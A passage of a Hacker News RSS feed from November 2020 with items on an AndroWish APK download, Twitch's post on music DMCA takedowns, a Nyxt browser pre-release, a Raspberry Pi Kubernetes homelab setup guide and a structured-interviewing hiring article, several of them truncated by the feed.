JGOAbWFYwct2PSHrbLsPveEHfyOY66C6GlYu3ceObZWtRKDH42m3/2+EgCcp9lZ/Lc2OIiQSj99Khant7kQ7t3rxer2hc0Nk0BXTHlbm/0NWmjcDwc7qW771szmnAovFAvgwGgXRMToG9E9m//56vL5D586SYOjXX/72N/n0U0+JCAG7ALaWvC/zyj/FF3AgpdpugpHHCrmbStvtcDl40CDy9+wJ+dnmorfl/tqlzT/r4mDMpVoGndMHCei0YDCAwRjsIzzn1ULW/LC/5bYrNJSWlXXa+YwQ8GgkX9UimVcxF4/f2v5AFax18PXMEjZuKG3bAtRo6Ne/7RTN4oY1qNLXwmQ0JgdfRyI2Fs6elMqWbRU4DmuOI1WVEcOGRwjYFZCXl8eihZU4XW7S0hLp01tLYiJoNBBQgypYaSkUFDSwd0cVe3ZX42/jFCSoA6qsX78h5GeFtcvlhsJXw3+4AGxb5WzdRVOq9O7VM0LAroDnHp/L9tw9wW23aZsTQqDRaNAoCmqgqVSGCF/d2rpjBzffcov86IMPWlyUX70wGIOqaVLmNE2uFx/4XeB2gdUmsdlclG2xsX5DAwUHSjnSEhFCsDfMNNAIATs58vfuP6TzNZFMAgFVPRTtchTkOzg2J6elEZNXPk9+/e08li8sQDTl+Cp6LUKA2+7BbnLjdKjYbGCzu7HaDh71hTB0hGDBl19GCHiy4/PPP5fTrr8+WKD5eEJKYo4o5/vhW98x673V1JsOOZ+ba/IftV9P4HK5WbJ0qbz0kks6nSUcOQkJExarFSmO//oZDXqunzatJQHf+ZqGxsYg2Zpe8uD/jxIGnZZbb/kNnZF8EQIeBcrKy4PNeo8ThBCMHD6Mfz33HI88/HAzOf71/POy0WRCcox8kRAfF8cf7rqLxx59tNMmJ0W24HAnSlFCtab5cffSaDh1zBieeeafXDh+fAty1NbWHZ0e2QYURcP0aVN54fnnO3VmXEQChok/P/aYuHzipaSnpR7TGater+e6a69l/Q/rxJHkA1Dlj+/zcfCZemRl8eB9f+KN11+PpGV2JSz88ksxb/4CuXz5coqLiykrL6e+oR6TydRUqbS1jJQEO6THxMQwZMgQxp13Hv9uRyrFxcYF7yLlUUlCAeh0OkYMH85DDz7A9OuvPylKZIkIrY4dK1eulBaLBbvdjs/nQ1VVhBDodDoMBgNxcXFcdtllYc/1bbfdJvN27aLBZMLtdjcXOheaoM9Rq1GCvkeNBr1eR0pyMiOGD+eKK65g8uTJJ9WaRgjYybF02TLpdLqQUqLotBh0egwGAxecPy6ydhFEEEEEJzX+H2k5VKNlyX30AAAAAElFTkSuQmCC">
</td></tr>
</tbody></div><p>The current AndroWish-debug.apk can be downloaded <a href="https://www.androwish.org/download/AndroWish-c48f047f5b-debug.apk">here</a> (about 36 MByte, requires "install from unknown sources" in Android settings). Prehistoric versions are <a href="http://www.ch-werner.de/sdltk/AndroWish">still available here</a>.


</p></div>]]>
            </description>
            <link>https://www.androwish.org/index.html/home</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061292</guid>
            <pubDate>Wed, 11 Nov 2020 18:36:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Music-Related Copyright Claims and Twitch]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25061259">thread link</a>) | @haunter
<br/>
November 11, 2020 | https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/ | <a href="https://web.archive.org/web/*/https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-i18n="ba2fc6a46b864e1cc0b2afadb1eff0cf-content">
    <p>Creators, we hear you. Your frustration and confusion with recent music-related copyright issues is completely justified. Things can–and should–be better for creators than they have been recently, and this post outlines our next steps to get there. Moving forward, we’ll be more transparent with what’s happening and what tools and resources we’re building to help.</p>

<p>Copyright law and the DMCA are not small or simple topics, so this won’t be a brief post. We’ll do our best to keep the legalese to a minimum, though there’s bound to be technical terms here and there.&nbsp;</p>

<h4 id="dmca-and-twitch"><strong>DMCA and Twitch</strong></h4>

<p>First off, a quick review of what DMCA actually is. The Digital Millennium Copyright Act (“DMCA”) is a set of US laws that allows you to create and share content on digital service providers like Twitch. We comply with the DMCA and similar laws worldwide. Part of complying means that when a copyright holder thinks a streamer has used their content without permission, we have a process in place for them to be able to request the content be taken down.</p>

<p>When we receive a DMCA notification, we process the notification in accordance with our <a href="https://www.twitch.tv/p/legal/dmca-guidelines/">DMCA Guidelines</a>. This includes removing the content, sharing the details with the channel owner, and tracking the allegation.&nbsp;</p>

<p>DMCA takedown notifications can affect your ability to stream because we, as part of our efforts to comply with the DMCA and similar global laws, issue and track copyright strikes and ban the accounts of those who repeatedly infringe the copyrights of others.&nbsp;</p>

<p>This policy is important because we respect the rights of all creators, including those who create or record music, as well as the rights of those who own and control copyrights. As a company that is built around a community of people who create content, we take allegations of copyright infringement seriously.&nbsp;</p>

<h4 id="recent-dmca-notifications"><strong>Recent DMCA notifications</strong></h4>

<p>How did we get to this moment? Until May of this year, streamers received <strong>fewer than 50 music-related DMCA notifications each year</strong> on Twitch. Beginning in May, however, representatives for the major record labels started sending <strong>thousands of DMCA notifications each week</strong> that targeted creators’ archives, mostly for snippets of tracks in years-old Clips. We continue to receive large batches of notifications, and we don’t expect that to slow down.&nbsp;</p>

<p>This means two things: 1) if you play recorded music on your stream, you need to stop doing that and 2) if you haven’t already, you should review your historical VODs and Clips that may have music in them and delete any archives that might.&nbsp;</p>

<p>We were as surprised by this sudden avalanche of notifications as many of you were. We also realized that we needed to provide streamers with more educational programs and content management tools to help you deal with this unprecedented number of notifications coming in all at once. So, while we continued to remove content targeted by these notifications as required by the DMCA, we understood VODs and Clips from years ago may not necessarily reflect your current approach to music. Therefore, we also paused the processing of strikes associated with these batched notifications in order to give you the tools, information, and time that you would need to deal with them.</p>

<p>We have analyzed the notifications we received during that period from the end of May through the middle of October. What we found is that more than 99% of the notifications were for tracks that streamers were playing in the background of their stream.&nbsp;</p>

<p>The point of the DMCA is to strike a balance between the interests of rights holders (the major record labels in this case) and creators. Because of this, we were compelled to delete the VODs and Clips that were identified in the notifications. This showed our commitment to upholding our obligations under the DMCA, while affording us the opportunity to sort out the best way to handle issuing strikes in these circumstances. Under these extraordinary circumstances, we recognized creators should have a reasonable chance to understand that content created in the past was being targeted as allegedly infringing and be given an opportunity to change their approach to music use before they got hit with strikes.</p>

<p>This led to the current situation, which is understandably frustrating and worrying for many of you. Given the circumstances, the warning email many of you received didn’t include all the information that you’d typically get in a DMCA notification (normally, when we receive a DMCA notification against your channel, we send you an email that includes information about the allegedly infringed work, who the claimant is, how the claimant can be contacted, and possible penalties under our repeat infringer policy, so that you can make an informed decision about whether to submit a counter notification or seek a retraction). We hear your feedback about how frustratingly little information we provided, and we should have made that warning email a lot more informative and helpful.</p>

<p>Over the last several months, we have done our best to manage this situation on behalf of both rights holders and creators. One of the mistakes we made was not building adequate tools to allow creators to manage their own VOD and Clip libraries. You’re rightly upset that the only option we provided was a mass deletion tool for Clips, and that we only gave you three-days notice to use this tool. We could have developed more sophisticated, user-friendly tools awhile ago. That we didn’t is on us. And we could have provided creators with a longer time period to address their VOD and Clip libraries – that was a miss as well. We’re truly sorry for these mistakes, and we’ll do better.</p>

<h4 id="how-to-avoid-dmca-notifications"><strong>How to avoid DMCA notifications&nbsp;</strong></h4>

<p>One important question we’ve heard from you is: how can I stream safely and confidently on Twitch without having to worry about getting DMCA notifications from music use?</p>

<p>Most importantly, <strong>don’t play recorded music in your stream</strong> unless you own all rights in the music, or you have the permission of the necessary rights holder(s). Doing this is the best protection for your streams going forward. If you’re unsure whether you own all the rights, it’s pretty likely you don’t. If you want to include recorded music in your stream, use a fully licensed alternative like Soundtrack by Twitch, or other rights cleared music libraries such as Soundstripe, Monstercat Gold, Chillhop, Epidemic Sound, and NCS.</p>

<p>While we haven’t received more than a handful of DMCA notifications targeting in-game music, if you’re playing games with recorded music in them, we recommend you review their End User License Agreements (that wall of text at the beginning of a game) to see how the terms cover streaming with that music. One way to do this is to search for a game’s official EULA online and then do a ctrl+f (Command+f on Mac) search for words like “stream,” “licensed,” and “music” to point you toward the correct sections. If you’re unsure about the rights, some games allow you to turn off music when streaming, or you can mute the game audio yourself. If neither of those apply, consider turning off VODs and Clips.&nbsp;</p>

<p>For your stream archives (VODs and Clips), right now your only options, if you think they contain unauthorized music, is to either go through them one by one, or, for Clips, use the “delete all” tool we’ve provided. We understand both of these options have downsides, and we’re working to provide you more and better options as soon as possible. These things will take time to get right, and new challenges may appear in the future. Regardless, we’re committing here and now to investing in building better tools and keeping you posted on our progress.</p>

<h4 id="new-products-and-tools"><strong>New products and tools</strong></h4>

<p>Ever since the influx of DMCA notifications began, we have been working on building new (and improving existing) tools to help creators (such as the Clips mass deletion tool). This work is still happening. Many of these changes won’t be visible to the community, but we’re focused on three areas where we heard you need more support from us:</p>

<p>First, you don’t have enough control over the recorded content on your channel. We have made improvements to enable you to mass delete Clips, but in addition, we will (1) expand the use of technology to detect copyrighted audio, and (2) give you more granular ways to manage your archive instead of just a “delete all” option.</p>

<p>Second, we’ll make it easier for you to control what audio from your live streams will show up in your recorded content. Soundtrack by Twitch has some of this technology built into it, and we’ll work to make it available for everyone regardless of whether you want to use Soundtrack, for which we’ve cleared all necessary rights, or music from others that provide rights-cleared music.</p>

<p>Third, we need to give you the ability to actually review your allegedly infringing content when you receive a DMCA notification, in addition to the details already provided in our takedown notifications - that is, information about what copyrighted work was allegedly infringed, who the claimant is, and how the claimant can be contacted. We also need to help you more easily file counter notifications if you believe you have the rights to use the content–for example, because you’ve secured a license, believe the use is a fair use,&nbsp; the claimant does not control the rights, or believe you have the right to use the music without permission.</p>

<p>Some of you have asked why we don’t have a license covering any and all uses of recorded music. We are actively speaking with the major record labels about potential approaches to additional licenses that would be appropriate for the Twitch service. That said, the current constructs for licenses that the record labels have with other services (which typically take a cut of revenue from creators for payment to record labels) make less sense for Twitch. The vast majority of our creators don’t have recorded music as a part of their streams, and the revenue implications to creators of …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/">https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/</a></em></p>]]>
            </description>
            <link>https://blog.twitch.tv/en/2020/11/11/music-related-copyright-claims-and-twitch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061259</guid>
            <pubDate>Wed, 11 Nov 2020 18:33:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nyxt Release 2 Pre-release 4]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25061101">thread link</a>) | @jmercouris
<br/>
November 11, 2020 | https://nyxt.atlas.engineer/article/release-2-pre-release-4.org | <a href="https://web.archive.org/web/*/https://nyxt.atlas.engineer/article/release-2-pre-release-4.org">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


  <meta charset="utf-8">
  <meta name="generator" content="pandoc">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>Nyxt 2 Pre-release 4</title>
  
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->


<header>

</header>
<p>We are happy to announce the fourth pre-release of Nyxt version 2.0.0. If you missed the previous pre-release announcement, see <a href="https://nyxt.atlas.engineer/article/release-2-pre-release-3.org">here</a>.</p>
<p>Nyxt 2 is a massive overhaul of the Nyxt 1 series. A lot of effort has been geared towards improving the code quality under the hood which should reflect on the overall user experience with better performance, increased stability and better accessibility.</p>
<p>This is a test release for everyone to try out before the final release. It contains experimental features and some parts are still unfinished. Please feel free to share your feedback on our <a href="https://github.com/atlas-engineer/nyxt/issues">GitHub issue tracker</a>!</p>
<p>Notable highlights:</p>
<ul>
<li><p>Overhauled status area view to resemble powerline.</p>
<ul>
<li>Hold <code>shift</code> to scroll the tabs horizontally.</li>
</ul></li>
<li><p>New <code>dark-mode</code> (experimental).</p></li>
<li><p>New universal package manager interface.</p>
<p>Install, uninstall, describe packages, list their files, change generations, etc. See the various <code>*-package-*</code> and <code>*-generation-*</code> commands.</p>
<ul>
<li><p>Currently only interfaces the Guix package manager.</p></li>
<li><p>Help to implement additional backends is welcome!</p></li>
</ul></li>
<li><p>New <code>nowebgl-mode</code>.</p></li>
<li><p>New <code>nyxt-init-file</code> helper to derive a file name relative to the Nyxt configuration folder.</p></li>
<li><p>No longer ask to restore session when there is none.</p></li>
</ul>
<p>For the complete change list, please consult the <a href="https://github.com/atlas-engineer/nyxt/blob/2-pre-release-4/documents/CHANGELOG.org#2-pre-release-4">CHANGELOG.org</a> file.</p>
<p>We hope you enjoy these new features, and that they help make you more productive. Thanks for reading :-)</p>

<h2 id="nyxt-powerline">Nyxt Powerline</h2>
<p><img src="https://nyxt.atlas.engineer/static/image/article/status-area.png"></p>
<h2 id="package-manager">Package Manager</h2>
<p><img src="https://nyxt.atlas.engineer/static/image/article/describe-os-package.png"></p>
<p><img src="https://nyxt.atlas.engineer/static/image/article/git-package.png"></p>
<h2 id="dark-mode">Dark Mode</h2>
<p><img src="https://nyxt.atlas.engineer/static/image/article/wiki-normal.png"></p>
<p><img src="https://nyxt.atlas.engineer/static/image/article/wiki-dark.png"></p>


</div></div>]]>
            </description>
            <link>https://nyxt.atlas.engineer/article/release-2-pre-release-4.org</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061101</guid>
            <pubDate>Wed, 11 Nov 2020 18:21:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Raspberry Pi Homelab with Kubernetes]]>
            </title>
            <description>
<![CDATA[
Score 109 | Comments 48 (<a href="https://news.ycombinator.com/item?id=25061097">thread link</a>) | @amitpm
<br/>
November 11, 2020 | https://amithm.ca/2020/10/kubernetes-raspberrypi-homelab/ | <a href="https://web.archive.org/web/*/https://amithm.ca/2020/10/kubernetes-raspberrypi-homelab/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>I’ve been running <a href="https://pi-hole.net/">Pi-Hole</a> on a Raspberry Pi 3b wired into my wifi router for most of last year and its been great. So when the new Raspberry Pi 4 came out, I picked one up. It sits on my desk, mostly for easy access to its USB ports, which allows me to hook it up to some of my esp32 devkits and push micropython code onto them. The pi4 has been a great general purpose development environment.</p><p>Recently, I’ve been wanting to write some trivial web endpoints for “internal” dashboards and such for the house. Plus, its a great excuse to learn Golang. In this day and age, clearly a dockerized golang dev environment is the way to go. Have I truly built something, if my dev environment isn’t dockerized?</p><p>So we’re agreed that dockerizing my dev environment is the way to go. Surely if my dev environment is dockerized, how much more should my app deployments use containers? Nothing less will do. But now I need a way to deploy and orchestrate said containers? I know! I should run a kubernetes cluster across my two Pi’s! Might as well run the Pi-hole on it as well, how hard can it be?</p><p>So that is what I spent the better part of last week figuring out.</p><figure><img src="https://imgs.xkcd.com/comics/automation.png" alt="Mandatory xkcd"><figcaption><center>Mandatory xkcd</center></figcaption></figure><p>This blog post walks through what I did, and how I did it, It’s purpose is two-fold -</p><ol><li>It is a map to allow me to retrace my steps if I need to</li><li>Perhaps it may prove of (dubious) use to you.</li></ol><p>So, both my Pi’s run Ubuntu server. I decided I should start from scratch, and flashed the latest ubuntu server image onto the SD cards for both Pi’s. Being a very optimistic person by nature, I expected to have Pi-hole back up and running on this new Kubernetes cluster within a day, and a day of unfiltered ads was a small price to pay for the experience. Alas, it was close to a week before I had Pi-Hole working on my network again, but yay! you get to learn from my experience!</p><p>I didn’t have much of an understanding of Kubernetes components going into this project - but hey, that’s what these projects are meant to give you, and boy, did it. So fret not if you don’t understand some of these terms, the kubernetes documentation pages are great!</p><p>None of this work is original. I cobbled together guides and walkthroughts from various sources to get to this frankenstein’s monster of a post that you see here. You can find links to the sources I used at the end of this page.</p><p>The first step to this journey involves making sure you have the required packages on all your machines. In my case, this was two machines - the Pi4 (called Terminus) and the Pi3b (called Trantor). You need <code>docker</code>, <code>kubelet</code>, <code>kubeadm</code> and <code>kubectl</code>. You want this installed on all your nodes. Terminus will be my master node, Trantor will be my worker. Asimov fans may protest that the Second Foundation was on Trantor after all, but let’s go with this for now. Setting static IPs on the master and workers on your cluster also helps, but I won’t cover that here.</p><p>Update apt repos and packages.</p><div><pre><code data-lang="bash">sudo apt-get update
sudo apt-get upgrade
</code></pre></div><p>Install Docker using the Convenience script. Yes, shame on you for blindly running a script you downloaded from the internet.</p><div><pre><code data-lang="bash">curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
</code></pre></div><p>Let’s make sure our non-root user can use Docker.</p><div><pre><code data-lang="bash">sudo usermod -aG docker $USER
</code></pre></div><p>Now there’s some additional setup that needs to be done in order to get Kubernetes to work on the Raspberry Pi - specifically enabling <code>cgroups</code>. You can do this by editing the file <code>/boot/firmware/cmdline.txt</code> and adding the following options at the end.</p><pre><code>cgroup_enable=cpuset cgroup_enable=memory cgroup_memory=1 swapaccount=1
</code></pre><p>You’ll need to reboot the Pi after this.</p><p>Add the K8s apt repo.</p><div><pre><code data-lang="bash">curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add -

cat <span>&lt;&lt;EOF | sudo tee /etc/apt/sources.list.d/kubernetes.list
</span><span>deb https://apt.kubernetes.io/ kubernetes-xenial main
</span><span>EOF</span>
</code></pre></div><p>You’ll notice we’re using <code>kubernetes-xenial</code> which was the latest release at the time of writing this. Update this to the latest release available if you need to.</p><p>Let’s install our main K8s helpers. We’ll also make sure they’re excluded freom any system upgrades. As the kubernetes <a href="https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/">documentation</a> says, “<code>kubeadm</code> and <code>kubectl</code> require special attention to upgrade.”</p><div><pre><code data-lang="bash">sudo apt update <span>&amp;&amp;</span> sudo apt install -y kubelet kubeadm kubectl
sudo apt-mark hold kubelet kubeadm kubectl
</code></pre></div><figure><img src="https://raw.githubusercontent.com/kubernetes/kubernetes/master/logo/logo.png" width="200" height="200"></figure><p>Create the cluster by running the following commands on the master node only. Pay special attention to the <code>--pod-network-cidr</code> parameter. You’ll need this CIDR range later on when setting up Flannel.</p><div><pre><code data-lang="bash"><span># Create the bootstrap token</span>
TOKEN<span>=</span><span>$(</span>sudo kubeadm token generate<span>)</span>
sudo kubeadm init --token<span>=</span><span>${</span>TOKEN<span>}</span> --pod-network-cidr<span>=</span>10.10.0.0/16
</code></pre></div><p>Congratulations. You are now the proud owner of a bare-metal kubernetes cluster (with one node). Admire the output, and consider running the commands they ask you to. For example, you’ll need a config file in <code>$HOME/.kube/config</code> if you want <code>kubectl</code> to work without too much hassle. Also make special note of the <code>kubeadm join</code> command as well, you’ll need to run that on your worker nodes.</p><p>These are the commands that the output from the previous step suggest you to run. Run this on the master node, in case that isn’t clear.</p><div><pre><code data-lang="bash">mkdir -p $HOME/.kube
sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
sudo chown <span>$(</span>id -u<span>)</span>:<span>$(</span>id -g<span>)</span> $HOME/.kube/config
</code></pre></div><p>Go run the <code>kubeadm join</code> commands on all the worker nodes you’d like to dedicate to this cluster. I’ll wait.</p><p>Going through this guide, you’ll quickly become familiar with the command <code>kubectl apply</code>. This command “applies a configuration to a resource” in kubernetes parlance and is typically provided a YAML “manifest” file as parameter.</p><p>So now we have a cluster, but technically Kubernetes doesn’t know how to handle networking between any pods that are scheduled on this cluster - atleast, that’s what I’ve understood. This is why you need an addon like Flannel to handle this for you. You can find a full list of Networking and Network Policy Addons <a href="https://kubernetes.io/docs/concepts/cluster-administration/addons/">here</a>. But in case it isn’t clear yet, we’ll use Flannel.</p><figure><img src="https://raw.githubusercontent.com/coreos/flannel/master/logos/flannel-horizontal-color.png"></figure><p>If you’ve specified a <code>pod-network-cidr</code> parameter when creating your cluster, you’ll need to edit the Flannel manifest with this CIDR before you apply it to the cluster.</p><p>Let’s download the default flannel manifest</p><div><pre><code data-lang="bash">curl https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml --output kube-flannel-updated.yml
</code></pre></div><p>Open it the file up in your favourite editor, and find the key <code>net-conf.json</code>. Update the CIDR given there with the right CIDR for your cluster. Once done, apply the manifest like so.</p><div><pre><code data-lang="bash">kubectl apply -f ./kube-flannel-updated.yml
</code></pre></div><p>To check if this worked, run the following command to get all pods running on your cluster.</p><p>You should see <code>core-dns</code> and <code>kube-flannel</code> pods running like so. I have two pods for each because I have two nodes in my cluster.</p><div><pre><code data-lang="bash">NAMESPACE              NAME                                          READY   STATUS    RESTARTS   AGE
kube-system            coredns-f9fd979d6-h9m47                       1/1     Running   <span>1</span>          3d2h
kube-system            coredns-f9fd979d6-m5jrd                       1/1     Running   <span>1</span>          3d2h
kube-system            kube-flannel-ds-2ngxd                         1/1     Running   <span>1</span>          3d2h
kube-system            kube-flannel-ds-kqflv                         1/1     Running   <span>1</span>          3d2h
</code></pre></div><p>Namespaces are used to isolate pods and services running on the same cluster. My data engineer brain thinks of the cluster as a database and namespaces as schemas, but I could be mistaken and maybe should be thinking of the cluster as a single database install, and the namespaces as individual databases. Or maybe, this is entirely the wrong abstraction to bring in. Scratch all of this, let’s move on.</p><p>We now have a cluster, that knows how to handle pod networking. Let’s run something on it! How about the <a href="https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/">Kubernetes dashboard</a>, so that you have something pretty to show your non-technically inclined significant other as the output of your hard work?</p><figure><img src="https://raw.githubusercontent.com/kubernetes/dashboard/master/docs/images/dashboard-ui.png" alt="Behold! The fruits of your labour!"><figcaption><center>Behold! The fruits of your labour!</center></figcaption></figure><p>We’ll create a namespace to hold everything related to the Kubernetes Dashboard. I’m calling the namespace - <code>kubernetes-dashboard</code>. Very imaginative, no?</p><div><pre><code data-lang="bash">kubectl create namespace kubernetes-dashboard
</code></pre></div><p>We’ll now download the manifest file for Kubernetes dashboard, because we need to make some changes.</p><div><pre><code data-lang="bash">curl https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.4/aio/deploy/recommended.yaml --output kubernetes-dashboard.yaml
</code></pre></div><p>I spent a few days trying to figure out why the manifest did not work out of the box, it kept failing when trying to pull the docker image. I worked around this by doing two things -</p><ol><li>Ran <code>docker pull kubernetesui/dashboard:v2.0.0</code> to cache a local copy of the docker image.</li><li>Commented out the <code>imagePullPolicy: Always</code> in the manifest file under the <code>kubernetes-dashboard</code> deployment block.</li></ol><p>For the more K8s experienced among you, you may be wondering why I did not try using the Helm chart - I did. Kubernetes-dashboard needs to run two services - <code>dashboard-metrics-scraper</code> and <code>kubernetes-dashboard</code>. The Helm chart only seemed to bring up <code>kubernetes-dashboard</code>. I’m sure I must be doing something wrong, but at this point my patience was wearing thin and I just wanted to get on with it.</p><p>Ok, so now we have an edited manifest, let’s apply it.</p><div><pre><code data-lang="bash">kubectl apply -f kubernetes-dashboard.yaml
</code></pre></div><p>It takes a little bit of time for the dashboard to come up. You can amuse yourself by looking at the pods as they spin up as follows -</p><div><pre><code data-lang="bash">watch kubectl get pods -n kubernetes-dashboard
</code></pre></div><p>You can get details on a specific pod by running -</p><div><pre><code data-lang="bash">kubectl describe pod &lt;pod_name&gt; -n kubernetes-dashboard
</code></pre></div><p>You can also tail logs on a specific pod by running -</p><div><pre><code data-lang="bash">kubectl -n kubernetes-dashboard logs &lt;pod_name&gt; -f
</code></pre></div><p>Once you see the dashbaord services up and running, let’s figure out how we actually get access to the dashboard UI.</p><p>We’ll assume that you haven’t configured kubectl on your local machine and are instead, running all these commands from your (headless) raspberry pi.</p><p>Run <code>kubectl proxy</code> first. This exposes the cluster API server over HTTP to the …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://amithm.ca/2020/10/kubernetes-raspberrypi-homelab/">https://amithm.ca/2020/10/kubernetes-raspberrypi-homelab/</a></em></p>]]>
            </description>
            <link>https://amithm.ca/2020/10/kubernetes-raspberrypi-homelab/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061097</guid>
            <pubDate>Wed, 11 Nov 2020 18:21:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacking Structured Interviewing: Hiring for Jobs You Don't Understand]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25061052">thread link</a>) | @nickpresta
<br/>
November 11, 2020 | https://mikedebo.com/work/2020/11/06/hacking-structured-interviewing-for-jobs-you-dont-understand/ | <a href="https://web.archive.org/web/*/https://mikedebo.com/work/2020/11/06/hacking-structured-interviewing-for-jobs-you-dont-understand/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Have you ever hired for a job you didn’t understand? It’s scary. If you don’t know how to do the job yourself, how can you assess what a strong candidate looks like?</p>

<p>In this post, we’ll see how to modify a well-researched interview methodology to quickly build a process  that helps you hire for the unknown in 4 steps. And, in the spirit of incrementalism, you’ll have something useful after each step.</p>

<!--more-->

<p>(This post was also published as a series of articles on LinkedIn. See part <a href="https://www.linkedin.com/pulse/hacking-structured-interviewing-hiring-jobs-you-dont-part-dibernardo/">one.</a>)</p>

<h2 id="different-people-same-problem">Different People, Same Problem</h2>

<p>A couple of weeks ago, I spoke to two very different people who had the same problem. The first was a senior engineering leader at a ~300 person company who needed to hire a data analytics lead, a role that was very unfamiliar to them. The second was a founder who was hiring their first software engineer.</p>

<p>They were pretty stressed about it. Perhaps you can relate.</p>

<p>In my experience, people tend to approach this problem in one of two ways:</p>
<ol>
  <li>“We don’t know how to hire for this position, and we could spend a lot of time creating an interview process that doesn’t even work. We should hire based on ‘culture fit’, which we can figure out by getting to know them. Sometimes we have to take risks.”</li>
  <li>“We don’t know how to hire for this position, It would be very expensive to hire the wrong person. We should create an exhaustive interview that assesses everything needed in this role, since this is a foundational hire. We don’t want to take too many risks.”</li>
</ol>

<p>These are both natural reactions. Both have clear downsides, and my experience is that both can easily lead to bad hiring decisions. So, perhaps the lesson is that if these are your only options, it’s probably better to take the former!</p>

<p>However, I think we can do better.</p>

<p>With a few hours of work, we can build a process that:</p>
<ul>
  <li>Reduces hiring risk</li>
  <li>Reduces bias and unfairness</li>
  <li>Creates a good experience for both candidate and the interviewers</li>
</ul>

<p>Furthermore, you can have something <em>usable</em>—not great, but usable—in under an hour.</p>

<p>How will we do this?</p>

<p>Starting from scratch would take too long. Luckily, there’s a lot of research-based practice that we can hack to make a good first hire without prohibitive effort.</p>

<p>In this article, we’ll look to and oldie-but-goodie as a guide.</p>

<h2 id="hacking-structured-interviewing">Hacking Structured Interviewing</h2>

<p>Structured interviewing is a hiring methodology that has been heavily researched and practices for decades. Google has summarized the research and their own experiences with it on <a href="https://rework.withgoogle.com/guides/hiring-use-structured-interviewing/steps/introduction/">re:work</a>, which is a super useful resource that I’ve often referred to.</p>

<p>In their introduction to the topic, the writers state:</p>

<blockquote>
  <p>Structured interviewing simply means using the same interviewing methods to
assess candidates applying for the same job. Research shows that structured
interviews can be predictive of candidate performance, even for jobs that are
themselves unstructured.</p>
</blockquote>

<p>Sounds great! If we’re hiring this role for the first time, the job is likely to be pretty unstructured.</p>

<p>However, in the very next paragraph, we read:</p>

<blockquote>
  <p>So why don’t more organizations use structured interview questions? Well,
they are hard to develop. You have to write them, test them, and make sure
interviewers stick to them.</p>
</blockquote>

<p>Oof. And here I am assuring you this won’t take long. Maybe it’ll just be easier to go with what you were originally planning. After all, how hard can it be?</p>

<p>Well:</p>

<blockquote>
  <p>Research has also shown that structured interviews aren’t more frequently used because, in general, interviewers everywhere think they’re good at interviewing and don’t need the help. Surely many of us like to think we’re excellent judges of character.</p>
</blockquote>

<blockquote>
  <p>But when it comes to hiring, don’t trust your gut. Research shows that during first encounters we make snap, unconscious judgments heavily influenced by our existing unconscious biases and beliefs. For example, in an interview context, without realizing it, we shift from assessing the complexities of a candidate’s competencies to hunting for evidence that confirms our initial impression. Psychologists call this <em>confirmation bias</em>.</p>
</blockquote>

<p>This cautionary clause helps us define our design problem.</p>

<p>We want to <em>quickly</em> create a hiring process that reduces our confirmation bias, because that will lead to better decisions.</p>

<p>The resources in re:work help with the confirmation bias part, but they don’t show us how to do it quickly. Let’s see how we can hack what they’ve shown us to get some speed out of it.</p>

<h2 id="the-raw-materials">The Raw Materials</h2>

<p>There are a handful of <a href="https://rework.withgoogle.com/guides/hiring-use-structured-interviewing/steps/know-the-components/">key elements</a> to a structured interview:</p>

<ol>
  <li>A small set of <strong>competencies</strong> that we’re looking for from candidates.</li>
  <li>Standard <strong>questions</strong> that test those competencies.</li>
  <li>Comprehensive <strong>feedback</strong> gathered by interviewers asking the questions.</li>
  <li>A <strong>rubric</strong> that helps interviewers consistently deliver their feedback.</li>
</ol>

<p>That seems like a lot to consider. However, this short list helps focus our hacking on techniques that are known to work.</p>

<p>We’re going to transform this list into a 4-step recipe for your own structured interview process. In the spirit of incrementalism, you’ll have something useful after each step.</p>

<p>If you follow the whole thing, it should take about 3-4 hours.</p>

<h2 id="step-1-define-competencies">Step 1: Define Competencies</h2>

<p>Take 15-30 mins. and come up with a list of 3-5 <em>competencies</em> that are important in this role.</p>

<p>It can be tempting to pick more than that, but please start small. If Google can reduce their hiring criteria to <a href="https://rework.withgoogle.com/guides/hiring-use-structured-interviewing/steps/define-hiring-attributes/">4 competencies</a>, I think we can get there too.</p>

<p>Each one should have a short 1-3 word “slug” that captures its spirit, and a sentence or two to describe what it means in more detail.</p>

<p>If you’re not sure how to start, you can hack this boring-but-effective list:</p>

<ol>
